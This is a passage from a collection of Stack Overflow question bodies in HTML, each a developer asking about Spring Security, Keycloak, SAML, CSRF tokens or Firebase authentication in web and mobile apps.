<li>Being careful about the request &amp; response format to avoid preflight. I may well have missed something
but it seems to me that the code snippets I showed above do what needs to be done in this regard.</li>
</ol>
"
"<p>I would like to know how the persistence context of the EntityManager is defined (and shared) in Spring Boot servlet stack.
I thought it was tied to the current thread but I have an application that insert a Filter into the filter chain (see security). This filter loads an User from the database using an autowired EntityManager. The purpose is to use this User later into a  service.</p>
<p>But it seems that that the PersistenceContext used into the Filter is not the same than the one used into the services: If I load the same user(same id) into a service from an autowired EntityManager, the resulting object is not the same that the one loaded into the filter:</p>
<pre><code>class MyFilter(val entityManager:EntityManager) : Filter {

  override fun doFilter(request: HttpServletRequest,response: HttpServletResponse,
                        filterChain: FilterChain) {

      SecurityContextHolder.getContextHolderStrategy().context.authentication = 
        entityManager.load(User::class.java,1)

      filterChain.doFilter(request,response)
  }

}

@Configuration
@EnableWebSecurity
class WebSecurityConfig(val entityManager: EntityManager) {

    @Bean
    @Throws(Exception::class)
    fun filterChain(http: HttpSecurity): SecurityFilterChain = http.run {
      addFilterAfter(MyFilter(entityManager),LogoutFilter::class.java)
      build()
    }
}

@Service
class MyService(val entityManager:EntityManager) {

  fun compareUsers() : Boolean {

    val securityUser: User = 
      SecurityContextHolder.getContextHolderStrategy().context.authentication as User

    // A call to the database is done (should take the user from the cache)
    val loadedUser : User = entityManager.load(User::class.java,1)

    // True: The 2 users represent the same object into database
    assert (securityUser.id==loadedUser.id)

    // Returns always false,
    return securityUser==loadedUser
  }

}

</code></pre>
<p>I checked and the same thread is used for <code>MyFilter::doFilter</code> and <code>MyService::compareUsers</code> function calls.
It seems that the persistence context is tied to the request only once the user is authenticated.
How can I do to share the PsrsistenceContext?</p>
"
"<p>I made a App in Flutter for Android and used Firebase google login. It worked well on the web, and Android Studio phone simulator. But when I uploaded it to play store console and downloaded on my phone and tried to login, a error like the following comes up. What is the problem and how do I fix it.</p>
<p>I thought it was a version problem so I tried updating it. Also I put it all the libraries needed as well.</p>
"
"<p>The way I understood firebase, the signOut() is pretty much out of the box use. No params, no arguments, nothing. Just a callback. Has that changed? I'm getting a cannot read email of null error which is not breaking my app, but I don't like the error message being there.</p>
<p>Here's the related screens and their relevant code - Sorry if I over-explain this. Trying not to leave any relevant code out</p>
<ul>
<li><p>Account Screen - Logout button resides in the Account page with a simple onPress event to a callback that calls firebase functions from a different file called AuthContext</p>
<pre><code>import { AuthContext } from '../context/AuthContext';
import {db, auth} from '../firebase';
import {onAuthStateChanged} from 'firebase/auth';
import { doc, getDoc } from 'firebase/firestore';

const {handleSignOut } = useContext(AuthContext); //👈 this calls the firebase functions. 

// 👇 In case it matters I wrote this to show the user's name and email in this screen
const [user, setUser] = useState({
  first: &quot;&quot;,
  last: &quot;&quot;,
  email: &quot;&quot;,
});

const getUser = () =&gt; {        
  onAuthStateChanged(auth, (user) =&gt; {
    let userEmail = user.email; 

    user !== null || user !== undefined
    const docRef = doc(db, 'useraccounts', userEmail)
    getDoc(docRef)
    .then((docSnap) =&gt; {
      if (docSnap.exists()){
        setUser(docSnap.data());
      } else {
        console.log(&quot;nothing here&quot;); 
      }      
    });
  }); 
}

useEffect(() =&gt; {
  getUser();
},[])
// 👆 End of get User related code ignore if irrelevant


// The logginOut function being that fires the handleSignOut callback 
const logginOut = () =&gt; {
  handleSignOut();
}

&lt;TouchableOpacity onPress={logginOut}&gt;
   Text style={styles.btnPrimaryText}&gt; Logout  &lt;/Text&gt;
&lt;/TouchableOpacity&gt;   
</code></pre>
</li>
<li><p>The AuthContext Screen - I am using AsyncStorage to persist the user's login status so they dont have to login every time the app is closed. I sense this is the culprit, but the Logout is supposed to terminate that.</p>
<pre><code>import React, {createContext, useState, useEffect} from 'react'
import AsyncStorage from '@react-native-async-storage/async-storage';
import {auth, db} from '../firebase';
import { signInWithEmailAndPassword, signOut, deleteUser, createUserWithEmailAndPassword } from &quot;firebase/auth&quot;;
import { collection, doc, setDoc } from 'firebase/firestore';

export const AuthContext = createContext()

export const AuthProvider = ({children}) =&gt; {
  const [userToken, setUserToken] = useState(&quot;&quot;);
  const [userInfo, setUserInfo] = useState(&quot;&quot;);
  const [error, setError] = useState(&quot;&quot;);

  const user = auth.currentUser;

  const handleLogin = async (email, password) =&gt; {
    try {
      const userCredential = await signInWithEmailAndPassword(auth, email, password);
      const user = userCredential.user;
      await AsyncStorage.setItem('userInfo', JSON.stringify(user));
      await setUserInfo(user);
      await setUserToken(user.accessToken);

    } catch (error) {
      console.log(error.message);
      setError(error.message);
    }    
  }

  if(userToken) {
    AsyncStorage.setItem('userToken', userToken);
  }

  const createAccount = (email, password, first, last) =&gt; {

    createUserWithEmailAndPassword(auth, email, password, first, last)
      .then( async () =&gt; {
        const newUserRef = collection(db, &quot;useraccounts&quot;);
        console.log(&quot;userid:&quot;, auth.currentUser.uid);

        await setDoc(doc(newUserRef, auth.currentUser.uid), {
          first: first, 
          last: last, 
          email: email.toLowerCase(),
          user_id: auth.currentUser.uid
        });
      })
      .then(() =&gt; {
        handleLogin(email, password);
        // console.log('User created', user);
      })
      .catch((error) =&gt; {
        console.error(error.message);
        setError(error.message);
      });
  }

  const handleSignOut = async () =&gt; {
    try {  
      await signOut(auth) 
      await AsyncStorage.removeItem('userToken') 
      await AsyncStorage.removeItem('userInfo');
      setUserToken(null);

    } catch (err) {
      // console.error(`Error signing out ${err}`); 
    }
  }

  const isLoggedIn = async () =&gt; {
    try {
      let userToken = await AsyncStorage.getItem('userToken');
      let userInfo = await AsyncStorage.getItem('userInfo');
      userInfo = JSON.parse(userInfo);
      setUserToken(userToken);

      if(userInfo) {
        setUserToken(userToken);
        setUserInfo(userInfo);
      }

    } catch (err) {
      console.log(`Loggedin Error ${err}` );
    }
  }

  const deleteAccount = async () =&gt; {
    try {
      await deleteUser(user).then(() =&gt; {
        console.log('User deleted');
        signOut(auth);   
      });
      await AsyncStorage.removeItem('userToken'); 
      await AsyncStorage.removeItem('userInfo');
      await setUserToken(null);
      await setUserInfo(null);
    } catch (err) {
      console.log(`Error deleting user ${err}`); 
    }
  }

  useEffect(() =&gt; {
    isLoggedIn();
  }, [])

  return (
    &lt;AuthContext.Provider value={{ handleLogin, handleSignOut, deleteAccount, createAccount, userToken, userInfo, error}}&gt;
      {children}
    &lt;/AuthContext.Provider&gt;
  );
}
</code></pre>
</li>
</ul>
"
"<p>I'm using the firebase service to authenticate users in my application. However, sending email verifications using the sendEmailVerification method does not send email verifications to all users, some may receive it, while others may not, even when resending the confirmation email, any idea why this problem occurs?</p>
"
"<p>I have just built a springboot3 reactive web application and now I want to add security to make it work with our in house aunthentication stack.</p>
<p>For another web-mvc application we do this by adding a <code>AbstractPreAuthenticatedProcessingFilter</code> to the HttpSecurity.</p>
<p>Now I'd like to do the same for my reactive application but I don't find any example or documentation on how to do this.</p>
"
"<p>I'm trying to create a dependency jar to include common security configurations for several web apps.</p>
<p>What I'm trying to do is to declare my own authentication provider; login/logout url and intially authenticate any request, next to that I'd want to let the final developer just define their custom authenticated (or unauthenticated) URLS.</p>
<p>Is there some way to do this?</p>
<p>I think is similar to spring security when it's added into a spring boot app when the developer has not defined a configuration.</p>
<p>Here is how I've been trying to do it.</p>
<p>Common-security project</p>
<pre class=""lang-java prettyprint-override""><code>@Configuration
public class MyCommonSecurityConfig {

    @Bean
    SecUserDetailsService userDetailsService() {
        return new CommonDetailsServiceImpl();
    }

    @Bean
    PasswordEncoder passwordEncoder() {
        return new CommonPasswordEncoder();
    }


    @Bean
    SecAuthenticationFilter authenticationFilter(AuthenticationManager authenticationManager) throws Exception {
        CommonAuthenticationFilter filter = new CommonAuthenticationFilter();
        filter.setAuthenticationManager(authenticationManager);
        filter.setAuthenticationFailureHandler(new CommonAuthenticationFailureHandler());
        filter.setAuthenticationSuccessHandler(new CommonAuthenticationSuccessHandler());
        filter.setFilterProcessesUrl(&quot;/commonLogin&quot;);
        return filter;
    }

    @Bean
    ProviderManager authProvider() {
        CommonAuthenticationProvider provider = new CommonAuthenticationProvider(this.passwordEncoder(), this.userDetailsService());
        return new ProviderManager(new AuthenticationProvider[]{provider});
    }

    @Bean
    public SecurityFilterChain defaultSecurityFilterChain(HttpSecurity http) throws Exception {
        http
            .sessionManagement((session)-&gt; session
                    .sessionFixation((sesFix) -&gt; sesFix.changeSessionId())
            )
            .authorizeHttpRequests((authorize) -&gt; authorize
                    .dispatcherTypeMatchers(DispatcherType.FORWARD, DispatcherType.ERROR).permitAll()
                    .antMatchers(&quot;/commonLogin&quot;).permitAll()
            )
            .logout((logout)-&gt; logout
                    .logoutUrl(&quot;/commonLogout&quot;)
                    .logoutSuccessUrl(&quot;/view/welcome&quot;).permitAll()
            )
        ;
        return http.build();
    }


}
</code></pre>
<p>Implementator's spring boot web app.</p>
<pre class=""lang-java prettyprint-override""><code>@Configuration
public class AppSecurityConfig {

    @Bean
    SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
        .csrf().disable()
        .authorizeHttpRequests((authorize) -&gt; authorize
            .shouldFilterAllDispatcherTypes(false)
            .dispatcherTypeMatchers(DispatcherType.FORWARD, DispatcherType.ERROR).permitAll()
            .antMatchers(&quot;/js/**&quot;, &quot;/css/**&quot;, &quot;/fonts/**&quot;, &quot;/images/**&quot;).permitAll()
            .anyRequest().authenticated()
        )
        ;
        return http.build();
    }
}
</code></pre>
<p>When using browser to access /view/welcome page, I'm getting an 403 forbidden status code.</p>
<p>I'm trying to append requestMatchers to same SecurityFilterChain from different jars</p>
"
"<p>On the Next.js side, I installed the installations through Google's documentation on Firebase without any problems. While it works perfectly in all browsers, there is a problem in the sign-in phase in Microsoft Edge.</p>
<p><a href=""https://i.stack.imgur.com/ge1qP.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/ge1qP.png"" alt=""Console Logs"" /></a></p>
<p>When I turn off the switch named &quot;Tracking prevention for this site (Balanced)&quot; in the screenshot, there is no problem accessing the Firebase auth.</p>
<p><a href=""https://i.stack.imgur.com/vjC1L.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/vjC1L.png"" alt="""" /></a></p>
"
"<p>As i see google sign in can rather create a user or sign in it so in my case i need to add a document to firestore db then redirect to &quot;/setup-profile&quot; when the user signs up or just redirect to &quot;/&quot; in case user signs in and already has the document.</p>
<p>Hook to get current user:</p>
<pre><code>export const useGetCurrentUser = () =&gt; {
  const [currentUser, setCurrentUser] = useState&lt;CurrentUser | null&gt;(null);
  const [loading, setLoading] = useState&lt;boolean&gt;(true);

  useEffect(() =&gt; {
    onAuthStateChanged(auth, async (user) =&gt; {
      if (user) {
        const snapshot = await getDoc(doc(db, &quot;users&quot;, user.uid));
        setCurrentUser(snapshot.data() as CurrentUser);
        setLoading(false);
      }
    });
  }, []);

  return { currentUser, loading };
};
</code></pre>
<p>Google auth:</p>
<pre><code>  const { currentUser } = useGetCurrentUser();
  const router = useRouter();

  const handleAuthWithGoogle = () =&gt; {
    signInWithRedirect(auth, provider);
  };

  useEffect(() =&gt; {
    getRedirectResult(auth).then((result) =&gt; {
      const user = result.user;
      if (user.uid !== currentUser?.uid) {
        setDoc(doc(db, &quot;users&quot;, user.uid), {
          uid: user.uid,
          name: user.displayName,
          email: user.email,
        });
        router.push(&quot;/setup-profile&quot;);
      } else {
        router.push(&quot;/&quot;);
      }
    });
  }, []);
</code></pre>
<p>The problem is that currentUser.uid is undefined in the second code. Any suggestions?</p>
"
"<p>so i've built a frontend and now i'm working on a backend that has security rules based on custom claims. I'm getting an error that i can't understand. I've run the callable functions and logged out and back in but i still get an error message when i try to change document details. I'm trying to edit a document in firestore, a document belonging to the user. So its either the user makes a change or an admin can make a change.</p>
<p>edit submission:</p>
<pre><code> const onSubmit = async () =&gt; {
    const editRef = doc(db, `images/${imageID}`);
try {
        await updateDoc(editRef, {
          aLabels: aLabels,
        });
      } catch (error) {
        console.log(error.message);
        toast.error(&quot;Something went wrong&quot;);
      }
}

</code></pre>
<p><code>adminClaims.js</code></p>
<pre><code>const functions = require(&quot;firebase-functions&quot;);
const admin = require(&quot;firebase-admin&quot;);

exports.setAdminClaims = functions.https.onRequest(async (req, res) =&gt; {
  const adminUIDs = [
    &quot;pyqPlr3BT7LwzxBerxi1seqDrv6x&quot;
  ];

  await Promise.all(
    adminUIDs.map((uid) =&gt;
      admin.auth().setCustomUserClaims(uid, { admin: true })
    )
  );

  res.send(&quot;Done configuring rules&quot;);
});
</code></pre>
<p>firestore security rules</p>
<pre><code>rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    match /{document=**} {
    allow read, write: if false; //line 5
    }
match /images/{image} {
    allow read: if true;
      allow create: if isLoggedIn() //line 16
      allow update, delete: if isLoggedIn() &amp;&amp; isOwner() || isAdmin() 
    }

function isLoggedIn() {
    return request.auth.uid != null;
    }

    function isOwner() {
      return request.auth.uid == resource.data.user
    }

    function isAdmin() {
      return request.auth.token.role.admin == true
    }
}


</code></pre>
<p>Error message</p>
<blockquote>
<p>PERMISSION_DENIED:  false for 'update' @ L5, evaluation error at
L16:32 for 'update' @ L16, false for 'update' @ L5, Property role is
undefined on object. for 'update' @ L16</p>
</blockquote>
"
"<p><a href=""https://i.stack.imgur.com/0f2sk.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/0f2sk.png"" alt=""enter image description here"" /></a>
<a href=""https://i.stack.imgur.com/GuX3c.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/GuX3c.png"" alt=""enter image description here"" /></a></p>
<p>What has been done is the linking process only</p>
<p>I tried to update my Flutter version but to no avail
and I found these errors:
Could not run phased build action using the connection to Gradle distribution ... Java(0) [Ln 1, Col 1</p>
<p>org.gradle.api.ProjectConfigurationException: A problem occurred configuring root project 'andro</p>
<p>A problem occurred configuring the root project 'android'.</p>
<p>A problem occurred evaluating the root project 'android'.</p>
<p>A problem occurred configuring project ':app'.</p>
<p>Could not resolve all files for configuration ':app:classpath'.</p>
<p>on ex...</p>
<p>Could not resolve com.google.gms:google-services:4.4.1.</p>
"
"<p>Error :</p>
<blockquote>
<p>testing.html:20 Uncaught ReferenceError: sendOTP is not defined<br />
at HTMLButtonElement.onclick (testing.html:20:51)<br />
onclick   @   testing.html:20</p>
</blockquote>
<p>I am trying to build a test Mobile number and OTP ver. website using firebase. I am getting this error in console when i am inserting the mobile number and clicking Send OTP button.</p>
<p>My HTML code:</p>
<pre class=""lang-html prettyprint-override""><code>&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
    &lt;title&gt;Firebase OTP Verification&lt;/title&gt;
    &lt;!-- Add Firebase SDK --&gt;
    &lt;script src=&quot;https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js&quot;&gt;&lt;/script&gt;
    &lt;script src=&quot;https://www.gstatic.com/firebasejs/9.6.10/firebase-auth-compat.js&quot;&gt;&lt;/script&gt;
    &lt;script src=&quot;https://www.gstatic.com/firebasejs/9.6.10/firebase-auth-recaptcha-compat.js&quot;&gt;&lt;/script&gt;

    &lt;!-- Include your separate script --&gt;
    &lt;script src=&quot;firebase-script.js&quot; type=&quot;module&quot;&gt;&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;h1&gt;OTP Verification&lt;/h1&gt;
    &lt;form id=&quot;otpForm&quot;&gt;
        &lt;label for=&quot;phoneNumber&quot;&gt;Phone Number:&lt;/label&gt;
        &lt;input type=&quot;tel&quot; id=&quot;phoneNumber&quot; required&gt;
        &lt;button type=&quot;button&quot; onclick=&quot;sendOTP()&quot;&gt;Send OTP&lt;/button&gt;

        &lt;label for=&quot;otp&quot;&gt;Enter OTP:&lt;/label&gt;
        &lt;input type=&quot;text&quot; id=&quot;otp&quot; required&gt;
        &lt;button type=&quot;button&quot; onclick=&quot;verifyOTP()&quot;&gt;Verify OTP&lt;/button&gt;
    &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>My JavaScript code:-</p>
<pre class=""lang-js prettyprint-override""><code>// firebase-script.js
import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.6.10/firebase-app.js';
import { getAuth, signInWithPhoneNumber, RecaptchaVerifier } from 'https://www.gstatic.com/firebasejs/9.6.10/firebase-auth.js';

const firebaseConfig = {
    apiKey: &quot;AIzaSyC01PgXhZ9-9BP01GTWJSs473fmGz5n7Kk&quot;,
    authDomain: &quot;otp-verification-27a65.firebaseapp.com&quot;,
    projectId: &quot;otp-verification-27a65&quot;,
    storageBucket: &quot;otp-verification-27a65.appspot.com&quot;,
    messagingSenderId: &quot;25699686034&quot;,
    appId: &quot;1:25699686034:web:b56ff82c6a8685d57cf84b&quot;,
    measurementId: &quot;G-P0YV1RSGXT&quot;
};

// Initialize Firebase
const firebaseApp = initializeApp(firebaseConfig);
const auth = getAuth(firebaseApp);

function sendOTP() {
    const phoneNumber = document.getElementById('phoneNumber').value;
    const appVerifier = new RecaptchaVerifier('otpForm');

    signInWithPhoneNumber(auth, `+${phoneNumber}`, appVerifier)
        .then((confirmationResult) =&gt; {
            window.confirmationResult = confirmationResult;
            console.log(&quot;OTP Sent!&quot;);
        })
        .catch((error) =&gt; {
            console.error(&quot;Error sending OTP: &quot;, error.message);
        });
}

function verifyOTP() {
    const otp = document.getElementById('otp').value;
    window.confirmationResult.confirm(otp)
        .then((result) =&gt; {
            console.log(&quot;OTP Verified!&quot;);
        })
        .catch((error) =&gt; {
            console.error(&quot;Error verifying OTP: &quot;, error.message);
        });
}
</code></pre>
<p>I want that the OTP gets verified and the page is redirected to another webpage.</p>
"
"<p>I currently have a Spring application which allows form login and, on successfully POSTing user credentials to the <code>/login</code> endpoint of my authentication <code>FilterChain</code>, returns a <code>ResponseEntity</code> object containing a JWT to the front-end client. This JWT is then included in subsequent requests made by the front end to resource sever endpoints.</p>
<p>I'm now looking to add OAuth2 login capabilities (i.e. allowing users to log in via Google &amp; GitHub) and have logic in my custom <code>AuthenticationSuccessHandler</code> which stores/ loads the OAuth2 users as local users in my database.</p>
<p>My question is: where in this flow should I generate &amp; return a JWT to the front end for resource server access in the case of OAuth2 sign-in? For form logins, handling this within a controller was straightforward but because I don't have a similar structure for OAuth2 sign-ins, I'm at a bit of a loss.</p>
"
"<p><strong>Background:</strong></p>
<p>We have a Java Spring Security 6 backend application that is a REST API resource server hosted as a &quot;cross-domain&quot; server for access from our UI application. In future, we expect this resource server to be also accessible from our mobile clients.</p>
<p>We tried enabling CSRF protection on this server by following the <a href=""https://docs.spring.io/spring-security/reference/servlet/exploits/csrf.html#csrf-integration-mobile"" rel=""nofollow noreferrer"">spring security guide</a></p>
<p>As outlined in the above guide, our approach was to -</p>
<ol>
<li>Expose a public / no-authentication-required <code>/csrf</code> endpoint that can generate a CSRF token on demand</li>
</ol>
<pre class=""lang-java prettyprint-override""><code>    @RequestMapping(value = &quot;/csrf&quot;, method = RequestMethod.GET)
    @ResponseBody
    public CsrfToken csrf(CsrfToken csrf){
        return csrf;
    }
</code></pre>
<ol start=""2"">
<li>The client will retrieve the token from response and set the <code>X-CSRF-TOKEN</code> header on subsequent requests to the server</li>
</ol>
<p>The response from <code>/csrf</code> endpoint is returning the hashed token and NOT the plain text CSRF token. Example response below -</p>
<pre class=""lang-json prettyprint-override""><code>{
    &quot;parameterName&quot;: &quot;_csrf&quot;,
    &quot;token&quot;: &quot;ANzzM8y17Bqhrzpjk7DZtmFAhUYYi6PdLn5rwxgzB7KLV0LBNbqXAvvUj3uMmg9RoZ3thFl2qCQqvJfwGklf8SkKZXLyZXP3&quot;,
    &quot;headerName&quot;: &quot;X-XSRF-TOKEN&quot;
}
</code></pre>
<p>Attempting to use the hashed CSRF token on the subsequent HTTP POST request is resulting in server denying the request with a log message <code>DEBUG org.springframework.security.web.csrf.CsrfFilter - Invalid CSRF token found for &lt;URL&gt;</code></p>
<hr />
<p><strong>Question:</strong></p>
<p>We tried to see if there is plain text token available for returning via the <code>/csrf</code> endpoint but could not find any possible way to do so. Are we approaching this wrong?</p>
<p>Are we supposed to be using hashed token? If not, how to return plain text token?</p>
<p>Unable to find any code examples to retrieve the plain text token.</p>
<hr />
<p><strong>Our SecurityConfig.java:</strong></p>
<pre class=""lang-java prettyprint-override""><code>    @Bean
    protected SecurityFilterChain filterChain(HttpSecurity http) {
        try {
            logger.info(&quot;Configuring global security. All endpoints (existing or future) will require authentication unless additional logic is added to JwtRequestFilter&quot;);
            XorCsrfTokenRequestAttributeHandler delegate = new XorCsrfTokenRequestAttributeHandler();
            // set the name of the attribute the CsrfToken will be populated on
            delegate.setCsrfRequestAttributeName(&quot;_csrf&quot;);
            // Use only the handle() method of XorCsrfTokenRequestAttributeHandler and the
            // default implementation of resolveCsrfTokenValue() from CsrfTokenRequestHandler
            CsrfTokenRequestHandler requestHandler = delegate::handle;
            return http
                    .csrf(csrf -&gt; csrf
                      // cross token CSRF Repo setup exactly as shown at -
                      // https://stackoverflow.com/a/53049694/829542
                            .csrfTokenRepository(crossDomainCsrfTokenRepository)
                            .csrfTokenRequestHandler(requestHandler)
                            .ignoringRequestMatchers(applicationPathConfig.getCsrfPathsToIgnoreTransformed().toArray(new String[0])))
                    .authorizeHttpRequests(auth -&gt; auth
                            .requestMatchers(noAuthPatterns).permitAll()
                            .anyRequest().authenticated()
                    )
                    .exceptionHandling(Customizer.withDefaults())
                    .sessionManagement(sess -&gt; sess.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
                    .addFilterBefore(new CsrfCookieFilter(), UsernamePasswordAuthenticationFilter.class)
                    .addFilterBefore(authFilter, CsrfCookieFilter.class)
                    .build();
        } catch (Exception ex) {
            throw new AuthenticationException(ex.getMessage());
        }
    }
</code></pre>
<p><strong>CSRF Filter:</strong></p>
<pre class=""lang-java prettyprint-override""><code>@Component
public final class CsrfCookieFilter extends OncePerRequestFilter {

    private static final Logger logger = LoggerFactory.getLogger(CsrfCookieFilter.class);

    @Override
    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)
            throws ServletException, IOException {
        logger.debug(&quot;Adding csrf header to request &quot;);
        CsrfToken csrfToken = (CsrfToken) request.getAttribute(&quot;_csrf&quot;);
        // Render the token value to a cookie by causing the deferred token to be loaded
        csrfToken.getToken();

        filterChain.doFilter(request, response);
    }
}
</code></pre>
"
"<p>I am facing an issue retrieving the authenticated user after receiving SAML from Microsoft Intra ID as the Identity Provider (IdP). The Saml2AuthenticatedPrincipal object is always <strong>null</strong>.</p>
<pre><code>  @RequestMapping(&quot;/init&quot;)
    public ResponseEntity&lt;String&gt; test(@AuthenticationPrincipal Saml2AuthenticatedPrincipal principal) {
        System.out.println(principal.getAttributes());
        return ResponseEntity.ok(&quot;success&quot;);

    }
</code></pre>
<p><strong>- spring boot version</strong>: 3.2.2
**- package of Saml2AuthenticatedPrincipal:**org.springframework.security.saml2.provider.service.authentication</p>
<p>I have tried the following:
Configuring Spring Security SAML with Intra ID as IdP.
Successfully receiving the SAML response after login.
Parsing the SAML response and extracting the user attributes.
However, the Saml2AuthenticatedPrincipal object is still null. I am not sure what I am missing.</p>
"
"<p>In my application I am trying to sign in with google redirect. My redirect login works on my chrome browser but my safari browser does not work.</p>
<p>Here is some code that I have that works on chrome</p>
<pre class=""lang-js prettyprint-override""><code>  try {
      const result = await getRedirectResult(auth);
    } catch (err) {
      if (err.code === 'auth/credential-already-in-use') {
        const cred = GoogleAuthProvider.credentialFromError(err);
        signInWithCredential(auth, cred);
      }
    }
</code></pre>
<p>In the above snippet, I see that <code>result</code> would contain the auth credential object. In safari, the auth credential is <code>null</code>. I've checked the documentation here <a href=""https://firebase.google.com/docs/auth/web/redirect-best-practices#signinwithpopup"" rel=""nofollow noreferrer"">https://firebase.google.com/docs/auth/web/redirect-best-practices#signinwithpopup</a> but I'm working with localhost and it's failing.</p>
<p>I found in this documenation <a href=""https://firebase.google.com/docs/reference/js/v8/firebase.auth.Auth#getredirectresult"" rel=""nofollow noreferrer"">https://firebase.google.com/docs/reference/js/v8/firebase.auth.Auth#getredirectresult</a> that <code>If no redirect operation was called, returns null.</code> So in this case, my guess is that the redirect operation was not called on my browser. What gives?</p>
"
"<p>I'd like to know if anyone has a good resource that explains in technical detail how apps (e.g. banking apps) that push an authorisation message through the app to authorise certain transactions work? Something which explains the architecture end to end would be great.</p>
<p>E.g. Does the mobile app poll the backend in the background or are there websockets in play?</p>
<p>I've tried to search but many explanations are either high level functional descriptions or mainly cover generic notification architectures. Many thanks in advance.</p>
"
"<p>I have decoded Jwt token like that. I added User Realm Role Token Mapper in Client Scope using Keyclock server. Thus we can access that claim directly from jwt.</p>
<pre><code>{
  &quot;exp&quot;: 1707597391,
  &quot;iat&quot;: 1707597091,
  &quot;jti&quot;: &quot;505e8da0-1035-49fc-be74-1c59ab15ac03&quot;,
  &quot;iss&quot;: &quot;http://localhost:8181/realms/spring-boot-microservices-realm&quot;,
  &quot;aud&quot;: &quot;account&quot;,
  &quot;sub&quot;: &quot;bcb69d29-b6a4-4c74-96f5-4e89e3f741a1&quot;,
  &quot;typ&quot;: &quot;Bearer&quot;,
  &quot;azp&quot;: &quot;spring-cloud-client&quot;,
  &quot;session_state&quot;: &quot;f36ff533-9403-4b15-9099-d1679e4afd13&quot;,
  &quot;acr&quot;: &quot;1&quot;,
  &quot;allowed-origins&quot;: [
    &quot;/*&quot;
  ],
  &quot;realm_access&quot;: {
    &quot;roles&quot;: [
      &quot;offline_access&quot;,
      &quot;ADMIN&quot;,
      &quot;uma_authorization&quot;,
      &quot;default-roles-spring-boot-microservices-realm&quot;
    ]
  },
  &quot;resource_access&quot;: {
    &quot;account&quot;: {
      &quot;roles&quot;: [
        &quot;manage-account&quot;,
        &quot;manage-account-links&quot;,
        &quot;view-profile&quot;
      ]
    }
  },
  &quot;scope&quot;: &quot;email profile&quot;,
  &quot;sid&quot;: &quot;f36ff533-9403-4b15-9099-d1679e4afd13&quot;,
  &quot;email_verified&quot;: false,
  &quot;roles&quot;: [
    &quot;offline_access&quot;,
    &quot;ADMIN&quot;,
    &quot;uma_authorization&quot;,
    &quot;default-roles-spring-boot-microservices-realm&quot;
  ],
  &quot;preferred_username&quot;: &quot;admin&quot;
}

</code></pre>
<p>Thats here my Security Config file</p>
<pre><code>
@Configuration
@EnableWebFluxSecurity
public class SecurityConfig {


    @Bean
    public SecurityWebFilterChain securityFilterChain(ServerHttpSecurity http) throws Exception{
        http
        .authorizeExchange(exchange -&gt; exchange
                .pathMatchers(&quot;/api/product/**&quot;).permitAll()
                .pathMatchers(&quot;/api/user/**&quot;).hasRole(&quot;ADMIN&quot;)
                .anyExchange().authenticated())
                .oauth2ResourceServer((oauth2) -&gt; oauth2
                .jwt(Customizer.withDefaults()));

        return http.build();
    }



    @Bean
    public JwtAuthenticationConverter con(){
        JwtAuthenticationConverter c = new JwtAuthenticationConverter();
        JwtGrantedAuthoritiesConverter cv = new JwtGrantedAuthoritiesConverter();
        cv.setAuthorityPrefix(&quot;&quot;); // Default &quot;SCOPE_&quot;
        cv.setAuthoritiesClaimName(&quot;roles&quot;); //Default &quot;scope&quot; or &quot;scp&quot;
        c.setJwtGrantedAuthoritiesConverter(cv);
        return c;
    }


}
</code></pre>
<p>I can obtain roles on my Jwt token and i use JwtAuthenticationConverter however still i can not access role based path it throws me 403 Forbidden exception. I didn't understands what is the problem exactly.</p>
"
"<p>While updating settings I want to run a thread that updates some extra things in the background (for which the user shouldn't wait). It used to work with Spring4 but cannot make it work in Spring5 (JDK17). I know I'm probably missing something silly I just cannot see it 🙃...</p>
<p>Basically I want to call this as Async:</p>
<pre><code>tenantUpdateHandler.update(tenantId, settings);
</code></pre>
<p>The call is wrapped in a Runnable class and started like so:</p>
<pre><code>UpdateTenantThread updateTenantThread = applicationCtx.getBean(UpdateTenantThread.class);
updateTenantThread.init(tenantId, libraryId, settings);
Thread updateThread = new Thread(updateTenantThread);
updateThread.start();
</code></pre>
<p>The exception I get after starting the thread:</p>
<pre><code>Exception in thread &quot;Thread-27&quot; org.springframework.security.authentication.AuthenticationCredentialsNotFoundException: An Authentication object was not found in the SecurityContext
    at org.springframework.security.access.intercept.AbstractSecurityInterceptor.credentialsNotFound(AbstractSecurityInterceptor.java:350)
    at org.springframework.security.access.intercept.AbstractSecurityInterceptor.beforeInvocation(AbstractSecurityInterceptor.java:214)
    at org.springframework.security.access.intercept.aopalliance.MethodSecurityInterceptor.invoke(MethodSecurityInterceptor.java:64)
    at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186)
    at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:763)
    at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:708)
    at com.app.saas.service.TenantService$$EnhancerBySpringCGLIB$$9d387e3f.update(&lt;generated&gt;)
    at com.app.saas.service.TenantUpdateHandlerImpl.update(TenantUpdateHandlerImpl.java:44)
    at com.app.core.service.UpdateTenantThread.run(UpdateTenantThread.java:47)
    at java.base/java.lang.Thread.run(Thread.java:833)
</code></pre>
<p>The TenantService from the stack is secured (<code>@Service</code>, <code>@Secured({Role.ADMIN})</code>)</p>
<p>I have enabled thread inheritance for Spring Security like so:</p>
<pre><code>&lt;bean class=&quot;org.springframework.beans.factory.config.MethodInvokingFactoryBean&quot;&gt;
    &lt;property name=&quot;targetClass&quot; value=&quot;org.springframework.security.core.context.SecurityContextHolder&quot;/&gt;
    &lt;property name=&quot;targetMethod&quot; value=&quot;setStrategyName&quot;/&gt;
    &lt;property name=&quot;arguments&quot;&gt;
